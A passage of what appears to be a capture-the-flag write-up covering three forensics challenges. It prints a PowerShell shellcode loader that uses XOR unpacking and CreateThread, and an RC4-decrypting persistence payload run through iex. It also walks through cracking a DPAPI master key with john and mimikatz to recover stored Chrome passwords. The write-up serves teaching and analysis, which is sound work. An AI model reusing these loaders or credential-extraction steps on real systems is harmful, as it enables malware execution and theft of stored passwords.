+<span class="err">$</span><span class="n">hRffYLENA</span> <span class="p">=</span> <span class="err">$</span><span class="n">tNZvQCljVk</span><span class="p">::</span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="m">0</span><span class="p">,[</span><span class="n">Math</span><span class="p">]::</span><span class="n">Max</span><span class="p">(</span><span class="err">$</span><span class="n">HVOASfFuNSxRXR</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span><span class="m">0</span><span class="n">x1000</span><span class="p">),</span><span class="m">0</span><span class="n">x3000</span><span class="p">,</span><span class="m">0</span><span class="n">x40</span><span class="p">);</span>
+
+<span class="err">$</span><span class="n">stage3</span> <span class="p">=</span> <span class="err">$</span><span class="n">stage1</span> <span class="p">+</span> <span class="err">$</span><span class="n">stage2</span><span class="p">;</span>
+<span class="na">
+</span><span class="na">[System.Runtime.InteropServices.Marshal]</span><span class="p">::</span><span class="n">Copy</span><span class="p">(</span><span class="err">$</span><span class="n">HVOASfFuNSxRXR</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="err">$</span><span class="n">hRffYLENA</span><span class="p">,</span><span class="err">$</span><span class="n">HVOASfFuNSxRXR</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+
+<span class="err">#</span> <span class="n">Unpack</span> <span class="n">Shellcode</span><span class="p">;</span>
+
+<span class="k">for</span><span class="p">(</span><span class="err">$</span><span class="n">i</span><span class="p">=</span><span class="m">0</span><span class="p">;</span> <span class="err">$</span><span class="n">i</span> <span class="p">-</span><span class="n">lt</span> <span class="err">$</span><span class="n">HVOASfFuNSxRXR</span><span class="p">.</span><span class="n">count</span> <span class="p">;</span> <span class="err">$</span><span class="n">i</span><span class="p">++)</span>
+<span class="p">{</span>
+    <span class="err">$</span><span class="n">HVOASfFuNSxRXR</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="err">$</span><span class="n">HVOASfFuNSxRXR</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">]</span> <span class="p">-</span><span class="n">bxor</span> <span class="m">0</span><span class="n">xd1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="err">#</span><span class="n">Unpack</span> <span class="n">Special</span> <span class="n">Orders</span><span class="p">!</span>
+
+<span class="k">for</span><span class="p">(</span><span class="err">$</span><span class="n">i</span><span class="p">=</span><span class="m">0</span><span class="p">;</span><span class="err">$</span><span class="n">i</span> <span class="p">-</span><span class="n">lt</span> <span class="err">$</span><span class="n">stage3</span><span class="p">.</span><span class="n">count</span><span class="p">;</span><span class="err">$</span><span class="n">i</span><span class="p">++){</span>
+    <span class="err">$</span><span class="n">stage3</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="err">$</span><span class="n">stage3</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">]</span> <span class="p">-</span><span class="n">bxor</span> <span class="m">0</span><span class="n">xd1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="err">$</span><span class="n">tNZvQCljVk</span><span class="p">::</span><span class="n">CreateThread</span><span class="p">(</span><span class="m">0</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="err">$</span><span class="n">hRffYLENA</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="m">0</span><span class="p">,</span><span class="m">0</span><span class="p">);</span>
+</code></pre></div><p>If we execute it, there is nothing printed and the powershell window is closing. I tried to print $stage3 (and I removed the last line to prevent the window closing), which is giving me the following output :</p>
+<div class="highlight"><pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="err">$</span> <span class="p">.</span><span class="err">\</span><span class="n">script</span><span class="p">.</span><span class="n">ps1</span>
+<span class="m">72</span> <span class="m">84</span> <span class="m">66</span> <span class="m">123</span> <span class="m">98</span> <span class="m">51</span> <span class="m">119</span> <span class="m">104</span> <span class="m">52</span> <span class="m">114</span> <span class="m">51</span> <span class="m">95</span> <span class="m">48</span> <span class="m">102</span> <span class="m">95</span> <span class="m">116</span> <span class="m">104</span> <span class="m">51</span> <span class="m">95</span> <span class="m">98</span> <span class="m">48</span> <span class="m">48</span> <span class="m">116</span> <span class="m">53</span> <span class="m">95</span> <span class="m">48</span> <span class="m">102</span> <span class="m">95</span> <span class="m">106</span> <span class="m">117</span> <span class="m">115</span> <span class="m">116</span> <span class="m">49</span> <span class="m">99</span> <span class="m">51</span> <span class="m">46</span> <span class="m">46</span> <span class="m">46</span> <span class="m">125</span>
+</code></pre></div><p>This looks like a decimal ASCII chain. After decoding it (decimal → ascii), I got the flag !</p>
+<p><img loading="lazy" src="/cyber2022_data/Untitled.png" alt="Untitled"  />
+</p>
+<h2 id="golden-persistence">Golden Persistence<a hidden class="anchor" aria-hidden="true" href="#golden-persistence">#</a></h2>
+<p>We have a <code>NTUSER.DAT</code> file. This file is used as a hive file (<code>HKEY_CURRENT_USER</code>) in Windows systems. We can navigate in it with Registry Explorer.</p>
+<p>Regarding the challenge description, we know that it is about persistence. Usually, persistence stuff are located in <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></p>
+<p>After navigating to the key, we can find the following value, which is highly suspicious :</p>
+<p><img loading="lazy" src="/cyber2022_data/Untitled%201.png" alt="Untitled"  />
+</p>
+<p>We can use this <a href="https://raikia.com/tool-powershell-encoder/">tool</a> to decrypt the payload :</p>
+<div class="highlight"><pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="n">function</span> <span class="n">encr</span> <span class="p">{</span>
+    <span class="n">param</span><span class="p">(</span>
+<span class="na">        [Byte[]</span><span class="p">]</span><span class="err">$</span><span class="n">data</span><span class="p">,</span>
+<span class="na">        [Byte[]</span><span class="p">]</span><span class="err">$</span><span class="n">key</span>
+      <span class="p">)</span>
+<span class="na"> 
+</span><span class="na">    [Byte[]</span><span class="p">]</span><span class="err">$</span><span class="n">buffer</span> <span class="p">=</span> <span class="n">New</span><span class="p">-</span><span class="n">Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="err">$</span><span class="n">data</span><span class="p">.</span><span class="n">Length</span>
+    <span class="err">$</span><span class="n">data</span><span class="p">.</span><span class="n">CopyTo</span><span class="p">(</span><span class="err">$</span><span class="n">buffer</span><span class="p">,</span> <span class="m">0</span><span class="p">)</span>
+<span class="na">    
+</span><span class="na">    [Byte[]</span><span class="p">]</span><span class="err">$</span><span class="n">s</span> <span class="p">=</span> <span class="n">New</span><span class="p">-</span><span class="n">Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="m">256</span><span class="p">;</span>
+<span class="na">    [Byte[]</span><span class="p">]</span><span class="err">$</span><span class="n">k</span> <span class="p">=</span> <span class="n">New</span><span class="p">-</span><span class="n">Object</span> <span class="n">Byte</span><span class="p">[]</span> <span class="m">256</span><span class="p">;</span>
+ 
+    <span class="k">for</span> <span class="p">(</span><span class="err">$</span><span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="err">$</span><span class="n">i</span> <span class="p">-</span><span class="n">lt</span> <span class="m">256</span><span class="p">;</span> <span class="err">$</span><span class="n">i</span><span class="p">++)</span>
+    <span class="p">{</span>
+        <span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="p">[</span><span class="n">Byte</span><span class="p">]</span><span class="err">$</span><span class="n">i</span><span class="p">;</span>
+        <span class="err">$</span><span class="n">k</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="err">$</span><span class="n">key</span><span class="p">[</span><span class="err">$</span><span class="n">i</span> <span class="p">%</span> <span class="err">$</span><span class="n">key</span><span class="p">.</span><span class="n">Length</span><span class="p">];</span>
+    <span class="p">}</span>
+ 
+    <span class="err">$</span><span class="n">j</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="err">$</span><span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="err">$</span><span class="n">i</span> <span class="p">-</span><span class="n">lt</span> <span class="m">256</span><span class="p">;</span> <span class="err">$</span><span class="n">i</span><span class="p">++)</span>
+    <span class="p">{</span>
+        <span class="err">$</span><span class="n">j</span> <span class="p">=</span> <span class="p">(</span><span class="err">$</span><span class="n">j</span> <span class="p">+</span> <span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">]</span> <span class="p">+</span> <span class="err">$</span><span class="n">k</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">])</span> <span class="p">%</span> <span class="m">256</span><span class="p">;</span>
+        <span class="err">$</span><span class="n">temp</span> <span class="p">=</span> <span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">];</span>
+        <span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">j</span><span class="p">];</span>
+        <span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">j</span><span class="p">]</span> <span class="p">=</span> <span class="err">$</span><span class="n">temp</span><span class="p">;</span>
+    <span class="p">}</span>
+ 
+    <span class="err">$</span><span class="n">i</span> <span class="p">=</span> <span class="err">$</span><span class="n">j</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="err">$</span><span class="n">x</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="err">$</span><span class="n">x</span> <span class="p">-</span><span class="n">lt</span> <span class="err">$</span><span class="n">buffer</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="err">$</span><span class="n">x</span><span class="p">++)</span>
+    <span class="p">{</span>
+        <span class="err">$</span><span class="n">i</span> <span class="p">=</span> <span class="p">(</span><span class="err">$</span><span class="n">i</span> <span class="p">+</span> <span class="m">1</span><span class="p">)</span> <span class="p">%</span> <span class="m">256</span><span class="p">;</span>
+        <span class="err">$</span><span class="n">j</span> <span class="p">=</span> <span class="p">(</span><span class="err">$</span><span class="n">j</span> <span class="p">+</span> <span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">])</span> <span class="p">%</span> <span class="m">256</span><span class="p">;</span>
+        <span class="err">$</span><span class="n">temp</span> <span class="p">=</span> <span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">];</span>
+        <span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">]</span> <span class="p">=</span> <span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">j</span><span class="p">];</span>
+        <span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">j</span><span class="p">]</span> <span class="p">=</span> <span class="err">$</span><span class="n">temp</span><span class="p">;</span>
+<span class="na">        [int]</span><span class="err">$</span><span class="n">t</span> <span class="p">=</span> <span class="p">(</span><span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">i</span><span class="p">]</span> <span class="p">+</span> <span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">j</span><span class="p">])</span> <span class="p">%</span> <span class="m">256</span><span class="p">;</span>
+        <span class="err">$</span><span class="n">buffer</span><span class="p">[</span><span class="err">$</span><span class="n">x</span><span class="p">]</span> <span class="p">=</span> <span class="err">$</span><span class="n">buffer</span><span class="p">[</span><span class="err">$</span><span class="n">x</span><span class="p">]</span> <span class="p">-</span><span class="n">bxor</span> <span class="err">$</span><span class="n">s</span><span class="p">[</span><span class="err">$</span><span class="n">t</span><span class="p">];</span>
+    <span class="p">}</span>
+ 
+    <span class="k">return</span> <span class="err">$</span><span class="n">buffer</span>
+<span class="p">}</span>
+
+<span class="n">function</span> <span class="n">HexToBin</span> <span class="p">{</span>
+    <span class="n">param</span><span class="p">(</span>
+<span class="na">    [Parameter(
+</span><span class="na">        Position=0, 
+</span><span class="na">        Mandatory=$true, 
+</span><span class="na">        ValueFromPipeline=$true)
+</span><span class="na">    ]</span>   
+<span class="na">    [string]</span><span class="err">$</span><span class="n">s</span><span class="p">)</span>
+    <span class="err">$</span><span class="k">return</span> <span class="p">=</span> <span class="err">@</span><span class="p">()</span>
+    
+    <span class="k">for</span> <span class="p">(</span><span class="err">$</span><span class="n">i</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="err">$</span><span class="n">i</span> <span class="p">-</span><span class="n">lt</span> <span class="err">$</span><span class="n">s</span><span class="p">.</span><span class="n">Length</span> <span class="p">;</span> <span class="err">$</span><span class="n">i</span> <span class="p">+=</span> <span class="m">2</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="err">$</span><span class="k">return</span> <span class="p">+=</span> <span class="p">[</span><span class="n">Byte</span><span class="p">]::</span><span class="n">Parse</span><span class="p">(</span><span class="err">$</span><span class="n">s</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="err">$</span><span class="n">i</span><span class="p">,</span> <span class="m">2</span><span class="p">),</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">Globalization</span><span class="p">.</span><span class="n">NumberStyles</span><span class="p">]::</span><span class="n">HexNumber</span><span class="p">)</span>
+    <span class="p">}</span>
+    
+    <span class="n">Write</span><span class="p">-</span><span class="n">Output</span> <span class="err">$</span><span class="k">return</span>
+<span class="p">}</span>
+<span class="na">
+</span><span class="na">[Byte[]</span><span class="p">]</span><span class="err">$</span><span class="n">key</span> <span class="p">=</span> <span class="err">$</span><span class="n">enc</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;Q0mmpr4B5rvZi3pS&#34;</span><span class="p">)</span>
+<span class="err">$</span><span class="n">encrypted1</span> <span class="p">=</span> <span class="p">(</span><span class="n">Get</span><span class="p">-</span><span class="n">ItemProperty</span> <span class="p">-</span><span class="n">Path</span> <span class="n">HKCU</span><span class="p">:</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">ZYb78P4s</span><span class="p">).</span><span class="n">t3RBka5tL</span>
+<span class="err">$</span><span class="n">encrypted2</span> <span class="p">=</span> <span class="p">(</span><span class="n">Get</span><span class="p">-</span><span class="n">ItemProperty</span> <span class="p">-</span><span class="n">Path</span> <span class="n">HKCU</span><span class="p">:</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">BjqAtIen</span><span class="p">).</span><span class="n">uLltjjW</span>
+<span class="err">$</span><span class="n">encrypted3</span> <span class="p">=</span> <span class="p">(</span><span class="n">Get</span><span class="p">-</span><span class="n">ItemProperty</span> <span class="p">-</span><span class="n">Path</span> <span class="n">HKCU</span><span class="p">:</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">AppDataLow</span><span class="err">\</span><span class="n">t03A1Stq</span><span class="p">).</span><span class="n">uY4S39Da</span>
+<span class="err">$</span><span class="n">encrypted4</span> <span class="p">=</span> <span class="p">(</span><span class="n">Get</span><span class="p">-</span><span class="n">ItemProperty</span> <span class="p">-</span><span class="n">Path</span> <span class="n">HKCU</span><span class="p">:</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Google</span><span class="err">\</span><span class="n">Nv50zeG</span><span class="p">).</span><span class="n">Kb19fyhl</span>
+<span class="err">$</span><span class="n">encrypted5</span> <span class="p">=</span> <span class="p">(</span><span class="n">Get</span><span class="p">-</span><span class="n">ItemProperty</span> <span class="p">-</span><span class="n">Path</span> <span class="n">HKCU</span><span class="p">:</span><span class="err">\</span><span class="n">AppEvents</span><span class="err">\</span><span class="n">Jx66ZG0O</span><span class="p">).</span><span class="n">jH54NW8C</span>
+<span class="err">$</span><span class="n">encrypted</span> <span class="p">=</span> <span class="s">&#34;$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)&#34;</span>
+<span class="err">$</span><span class="n">enc</span> <span class="p">=</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">Encoding</span><span class="p">]::</span><span class="n">ASCII</span>
+<span class="na">[Byte[]</span><span class="p">]</span><span class="err">$</span><span class="n">data</span> <span class="p">=</span> <span class="n">HexToBin</span> <span class="err">$</span><span class="n">encrypted</span>
+<span class="err">$</span><span class="n">DecryptedBytes</span> <span class="p">=</span> <span class="n">encr</span> <span class="err">$</span><span class="n">data</span> <span class="err">$</span><span class="n">key</span>
+<span class="err">$</span><span class="n">DecryptedString</span> <span class="p">=</span> <span class="err">$</span><span class="n">enc</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="err">$</span><span class="n">DecryptedBytes</span><span class="p">)</span>
+<span class="err">$</span><span class="n">DecryptedString</span><span class="p">|</span><span class="n">iex</span>
+</code></pre></div><p>The things that we need to do are:</p>
+<ul>
+<li>Extract the value of $encrypted1..5 in the registry ; and replace it in the script</li>
+<li>Replace $enc declaration before $key declaration</li>
+</ul>
+<p>Final script :</p>
+<div class="highlight"><pre class="chroma"><code class="language-csharp" data-lang="csharp"><span class="p">...</span>
+
+<span class="err">$</span><span class="n">enc</span> <span class="p">=</span> <span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">Encoding</span><span class="p">]::</span><span class="n">ASCII</span>
+<span class="na">[Byte[]</span><span class="p">]</span><span class="err">$</span><span class="n">key</span> <span class="p">=</span> <span class="err">$</span><span class="n">enc</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="s">&#34;Q0mmpr4B5rvZi3pS&#34;</span><span class="p">)</span>
+<span class="err">$</span><span class="n">encrypted1</span> <span class="p">=</span> <span class="s">&#34;F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39&#34;</span>
+<span class="err">$</span><span class="n">encrypted2</span> <span class="p">=</span> <span class="s">&#34;CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1&#34;</span>
+<span class="err">$</span><span class="n">encrypted3</span> <span class="p">=</span> <span class="s">&#34;C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D&#34;</span>
+<span class="err">$</span><span class="n">encrypted4</span> <span class="p">=</span> <span class="s">&#34;D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1&#34;</span>
+<span class="err">$</span><span class="n">encrypted5</span> <span class="p">=</span> <span class="s">&#34;84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB&#34;</span>
+<span class="err">$</span><span class="n">encrypted</span> <span class="p">=</span> <span class="s">&#34;$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)&#34;</span>
+<span class="na">[Byte[]</span><span class="p">]</span><span class="err">$</span><span class="n">data</span> <span class="p">=</span> <span class="n">HexToBin</span> <span class="err">$</span><span class="n">encrypted</span>
+<span class="err">$</span><span class="n">DecryptedBytes</span> <span class="p">=</span> <span class="n">encr</span> <span class="err">$</span><span class="n">data</span> <span class="err">$</span><span class="n">key</span>
+<span class="err">$</span><span class="n">DecryptedString</span> <span class="p">=</span> <span class="err">$</span><span class="n">enc</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="err">$</span><span class="n">DecryptedBytes</span><span class="p">)</span>
+<span class="err">$</span><span class="n">DecryptedString</span><span class="p">|</span><span class="n">iex</span>
+</code></pre></div><p>Then we execute it :</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ./script.ps1
+...
+<span class="nv">$flag</span><span class="o">=</span><span class="s2">&#34;HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}&#34;</span>
+</code></pre></div><h2 id="seized">Seized<a hidden class="anchor" aria-hidden="true" href="#seized">#</a></h2>
+<p>This challenge is about finding ransomware operators credentials in the AppData folder :</p>
+<p><img loading="lazy" src="/cyber2022_data/Untitled%202.png" alt="Untitled"  />
+</p>
+<p>After some researches about potential interesting location, I found the Google one. This folder contains data about Google Chrome and 2 particular files are interesting :</p>
+<ul>
+<li><code>AppData\Local\Google\Chrome\User Data\Local State</code>
+<ul>
+<li>Contains the key that encrypts the user’s passwords. This key is encrypted with the Master Key from the system, generated from various parameters, including the user’s password.</li>
+</ul>
+</li>
+<li><code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code>
+<ul>
+<li>This file is a database that contains login information : website, login, password. Passwords may (or not) be encrypted. In our case, there is the login <strong><a href="mailto:ransomoperator@draeglocker.com">ransomoperator@draeglocker.com</a></strong> and the associated password is encrypted.</li>
+</ul>
+</li>
+</ul>
+<p><img loading="lazy" src="/cyber2022_data/Untitled%203.png" alt="(https://www.alertra.com/blog/decrypting-browser-passwords-other-secrets)"  />
+</p>
+<p>Let’s find out if we can find the master key file. It should be located in <code>AppData\Roaming\Microsoft\Protect\{SID}</code> :</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nv">$Get</span><span class="n">-ChildItem</span> <span class="n">-Hidden</span> <span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Protect</span><span class="p">\</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3702016591</span><span class="p">-</span><span class="n">3723034727</span><span class="p">-</span><span class="n">1691771208</span><span class="p">-</span><span class="n">1002</span><span class="p">\</span>
+
+    <span class="n">Répertoire</span><span class="err">:</span>
+    <span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Protect</span><span class="p">\</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3702016591</span><span class="p">-</span><span class="n">3723034727</span><span class="p">-</span><span class="n">1691771208</span><span class="p">-</span><span class="n">1002</span>
+
+<span class="n">Mode</span>                 <span class="n">LastWriteTime</span>         <span class="n">Length</span> <span class="n">Name</span>
+<span class="p">----</span>                 <span class="p">-------------</span>         <span class="p">------</span> <span class="p">----</span>
+<span class="n">-a-hs</span><span class="p">-</span>        <span class="n">22</span><span class="p">/</span><span class="n">03</span><span class="p">/</span><span class="n">2022</span>     <span class="n">15</span><span class="err">:</span><span class="n">06</span>            <span class="n">468</span> <span class="n">865be7a6</span><span class="p">-</span><span class="n">863c</span><span class="p">-</span><span class="n">4d73-ac9f</span><span class="p">-</span><span class="n">233f8734089d</span>
+<span class="n">-a-hs</span><span class="p">-</span>        <span class="n">22</span><span class="p">/</span><span class="n">03</span><span class="p">/</span><span class="n">2022</span>     <span class="n">15</span><span class="err">:</span><span class="n">06</span>             <span class="n">24</span> <span class="n">Preferred</span>
+</code></pre></div><p>There is a master key file. Since it is encrypted, we need to decrypt it to extract the master key. The first thing to do is to convert the data to a crackable format :</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">$</span> <span class="n">python</span> <span class="n">DPAPImk2john</span><span class="p">.</span><span class="n">py</span> <span class="n">-mk</span> <span class="n">865be7a6</span><span class="p">-</span><span class="n">863c</span><span class="p">-</span><span class="n">4d73-ac9f</span><span class="p">-</span><span class="n">233f8734089d</span> <span class="n">-S</span> <span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3702016591</span><span class="p">-</span><span class="n">3723034727</span><span class="p">-</span><span class="n">1691771208</span><span class="p">-</span><span class="n">1002</span> <span class="n">-c</span> <span class="n">local</span>
+<span class="nv">$DPAPImk$2</span><span class="p">*</span><span class="n">1</span><span class="p">*</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">3702016591</span><span class="p">-</span><span class="n">3723034727</span><span class="p">-</span><span class="n">1691771208</span><span class="p">-</span><span class="n">1002</span><span class="p">*</span><span class="n">aes256</span><span class="p">*</span><span class="n">sha512</span><span class="p">*</span><span class="n">8000</span><span class="p">*</span><span class="n">a17612a0ebdfc203316e0c18c04729f1</span><span class="p">*</span><span class="n">288</span><span class="p">*</span><span class="n">7dd629ab5efc8442596e5fbe5b9fc695bf8a51384dfacabd7a1a214245f894383540eb3e00c009bd76f836ae991cef540d74c0a6a31527b7e1df4b0d55a6760e41271f3dcaad163a6fb648f898281424728485335676c0374735cab055088e66bc55a72fc2087d64038d1d716f5efd4bdd4ce19971d082db004a36de70c351a2bd9b6ba9cf8f89a7481150b26f5808bc</span>
+</code></pre></div><p>Let’s give our hash to john :</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">root@jtr:/hashes# ../jtr/run/john dump --wordlist<span class="o">=</span>rockyou.txt
+Using default input encoding: UTF-8
+Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>DPAPImk, DPAPI masterkey file v1 and v2 <span class="o">[</span>SHA1/MD4 PBKDF2-<span class="o">(</span>SHA1/SHA512<span class="o">)</span>-DPAPI-variant 3DES/AES256 256/256 AVX2 8x<span class="o">])</span>
+Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">8000</span> <span class="k">for</span> all loaded hashes
+Will run <span class="m">16</span> OpenMP threads
+Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+ransom           <span class="o">(</span>?<span class="o">)</span>
+1g 0:00:00:05 DONE <span class="o">(</span>2022-05-18 17:17<span class="o">)</span> 0.1692g/s 5457p/s 5457c/s 5457C/s 210392..bheibhie
+Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div><p>Bingo ! We got the password <code>ransom</code></p>
+<p>Now, we want to decrypt the master key using the <strong>holy</strong> mimikatz :</p>
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">mimikatz</span> <span class="c"># dpapi::masterkey /in:&#34;AppData\Roaming\Microsoft\Protect\S-1-5-21-3702016591-3723034727-1691771208-1002\865be7a6-863c-4d73-ac9f-233f8734089d&#34; /sid:S-1-5-21-3702016591-3723034727-1691771208-1002 /password:ransom /protected</span>
+<span class="p">**</span><span class="n">MASTERKEYS</span><span class="p">**</span>
+  <span class="n">dwVersion</span>          <span class="err">:</span> <span class="n">00000002</span> <span class="p">-</span> <span class="n">2</span>
+  <span class="n">szGuid</span>             <span class="err">:</span> <span class="p">{</span><span class="n">865be7a6</span><span class="p">-</span><span class="n">863c</span><span class="p">-</span><span class="n">4d73-ac9f</span><span class="p">-</span><span class="n">233f8734089d</span><span class="p">}</span>
+  <span class="n">dwFlags</span>            <span class="err">:</span> <span class="n">00000005</span> <span class="p">-</span> <span class="n">5</span>
+  <span class="n">dwMasterKeyLen</span>     <span class="err">:</span> <span class="n">000000b0</span> <span class="p">-</span> <span class="n">176</span>
+  <span class="n">dwBackupKeyLen</span>     <span class="err">:</span> <span class="n">00000090</span> <span class="p">-</span> <span class="n">144</span>
+  <span class="n">dwCredHistLen</span>      <span class="err">:</span> <span class="n">00000014</span> <span class="p">-</span> <span class="n">20</span>
+  <span class="n">dwDomainKeyLen</span>     <span class="err">:</span> <span class="n">00000000</span> <span class="p">-</span> <span class="n">0</span>
+<span class="no">[masterkey]</span>
+  <span class="p">**</span><span class="n">MASTERKEY</span><span class="p">**</span>
+    <span class="n">dwVersion</span>        <span class="err">:</span> <span class="n">00000002</span> <span class="p">-</span> <span class="n">2</span>
+    <span class="n">salt</span>             <span class="err">:</span> <span class="n">a17612a0ebdfc203316e0c18c04729f1</span>
+    <span class="n">rounds</span>           <span class="err">:</span> <span class="n">00001f40</span> <span class="p">-</span> <span class="n">8000</span>
+    <span class="n">algHash</span>          <span class="err">:</span> <span class="n">0000800e</span> <span class="p">-</span> <span class="n">32782</span> <span class="p">(</span><span class="n">CALG_SHA_512</span><span class="p">)</span>
+    <span class="n">algCrypt</span>         <span class="err">:</span> <span class="n">00006610</span> <span class="p">-</span> <span class="n">26128</span> <span class="p">(</span><span class="n">CALG_AES_256</span><span class="p">)</span>
+    <span class="n">pbKey</span>            <span class="err">:</span> <span class="n">7dd629ab5efc8442596e5fbe5b9fc695bf8a51384dfacabd7a1a214245f894383540eb3e00c009bd76f836ae991cef540d74c0a6a31527b7e1df4b0d55a6760e41271f3dcaad163a6fb648f898281424728485335676c0374735cab055088e66bc55a72fc2087d64038d1d716f5efd4bdd4ce19971d082db004a36de70c351a2bd9b6ba9cf8f89a7481150b26f5808bc</span>
+
+<span class="no">[backupkey]</span>
+  <span class="p">**</span><span class="n">MASTERKEY</span><span class="p">**</span>
+    <span class="n">dwVersion</span>        <span class="err">:</span> <span class="n">00000002</span> <span class="p">-</span> <span class="n">2</span>
+    <span class="n">salt</span>             <span class="err">:</span> <span class="n">9e4ad8f433383f8543cdc7f97d94cc46</span>
